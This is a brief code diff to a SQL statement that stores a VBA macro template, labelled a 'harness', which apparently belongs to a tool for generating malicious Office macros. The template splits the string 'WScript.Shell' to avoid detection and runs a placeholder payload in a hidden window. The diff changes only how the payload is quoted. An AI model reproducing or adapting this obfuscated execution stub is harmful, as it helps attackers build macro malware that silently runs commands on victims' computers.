@@ -396,9 +396,9 @@ End Function
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
 Sub |RANDOMNAME|()
     Dim c As String
-    c = Chr(34) & |PAYLOADTEXT| & Chr(34)
+    c = |PAYLOADTEXT|
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
-    s.Run c, 0
+    s.Run (Chr(34) & c & Chr(34)), 0
 End Sub
 
 ');
